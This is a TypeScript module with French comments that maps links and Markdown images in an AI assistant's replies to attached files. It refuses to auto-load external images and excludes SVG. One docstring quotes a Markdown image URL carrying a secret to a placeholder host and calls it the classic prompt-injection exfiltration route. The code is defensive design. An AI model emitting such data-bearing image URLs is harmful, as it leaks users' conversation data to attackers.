// Liens d'une réponse de DONNA vers un fichier qu'elle a joint à ce message.
//
// Un modèle écrit volontiers « [Rapport](sandbox:/mnt/data/Rapport.pdf) » ou
// « [Télécharger](/download/Rapport.pdf) » : ces cibles n'existent pas chez nous.
// Rendues telles quelles, elles ouvraient l'application elle-même dans un nouvel
// onglet. Le fichier, lui, est bien joint au message (carte « Fichiers »), donc on
// rattache le lien à cette pièce jointe quand on peut, et sinon on n'en fait pas
// un lien cliquable. Seuls http(s) et mailto: sortent de l'application.

export type LinkableFile = { name: string };

export type LinkTarget<F extends LinkableFile> = { kind: "external"; href: string } | { kind: "file"; file: F } | { kind: "text" };

const EXTERNAL = /^(https?:\/\/|mailto:)/i;

const fold = (value: string) => value.normalize("NFC").toLowerCase().trim();

function decoded(value: string): string {
  try {
    return decodeURIComponent(value);
  } catch {
    return value; // « % » isolé : on garde la forme brute plutôt que de casser le rendu
  }
}

/** Dernier segment du chemin, sans schéma `sandbox:`, requête ni ancre, décodé. */
export function hrefBasename(href: string): string {
  const path = href
    .trim()
    .replace(/^sandbox:/i, "")
    .replace(/[?#].*$/, "")
    .replace(/^[a-z][a-z0-9+.-]*:\/\/[^/]*/i, "");
  return decoded(path.split(/[/\\]/).filter(Boolean).pop() ?? "");
}

const extension = (name: string) => (name.includes(".") ? fold(name.split(".").pop() ?? "") : "");

export function linkTarget<F extends LinkableFile>(href: string | undefined, text: string, files: readonly F[]): LinkTarget<F> {
  const target = (href ?? "").trim();
  const byName = (name: string) => files.find((file) => fold(file.name) === fold(name));

  const base = target ? hrefBasename(target) : "";
  const named = base ? byName(base) : undefined;
  if (named) return { kind: "file", file: named };

  if (EXTERNAL.test(target)) return { kind: "external", href: target };

  // Le texte du lien est souvent le nom du fichier (« Rapport.pdf », « Télécharger Rapport.pdf »).
  const label = fold(text);
  const mentioned = label ? files.find((file) => file.name.length >= 4 && label.includes(fold(file.name))) : undefined;
  if (mentioned) return { kind: "file", file: mentioned };

  // Nom inventé mais un seul fichier joint, de même type : c'est lui que le lien vise.
  if (base && files.length === 1 && extension(base) && extension(base) === extension(files[0].name)) return { kind: "file", file: files[0] };

  return { kind: "text" };
}

const IMAGE_EXTENSIONS = new Set(["png", "jpg", "jpeg", "gif", "webp", "bmp", "avif"]);

/** Image affichable en ligne. SVG exclu : un SVG peut embarquer des scripts. */
export const isImageName = (name: string): boolean => IMAGE_EXTENSIONS.has(extension(name));

/**
 * Cible d'une image Markdown (« ![légende](src) ») dans une réponse. Une image externe n'est JAMAIS chargée
 * automatiquement : son adresse peut porter des données (« ![](https://x.example/?secret=…) » est le moyen classique
 * de faire sortir une information d'une conversation par injection). Seule une pièce jointe de ce message s'affiche.
 */
export type ImageTarget<F extends LinkableFile> =
  | { kind: "image"; file: F }
  | { kind: "file"; file: F }
  | { kind: "link"; href: string }
  | { kind: "text" };

export function imageTarget<F extends LinkableFile>(src: string | undefined, alt: string, files: readonly F[]): ImageTarget<F> {
  const target = linkTarget(src, alt, files);
  if (target.kind === "file") return isImageName(target.file.name) ? { kind: "image", file: target.file } : { kind: "file", file: target.file };
  if (target.kind === "external") return { kind: "link", href: target.href };
  return { kind: "text" };
}

/**
 * Noms (en minuscules) des pièces jointes déjà affichées EN LIGNE par une image Markdown du texte : la galerie d'images
 * sous la réponse ne les répète pas.
 */
export function inlineImageNames<F extends LinkableFile>(markdown: string, files: readonly F[]): Set<string> {
  const names = new Set<string>();
  for (const match of markdown.matchAll(/!\[([^\]]*)\]\(\s*<?([^)\s>]+)/g)) {
    const target = imageTarget(match[2], match[1], files);
    if (target.kind === "image") names.add(fold(target.file.name));
  }
  return names;
}
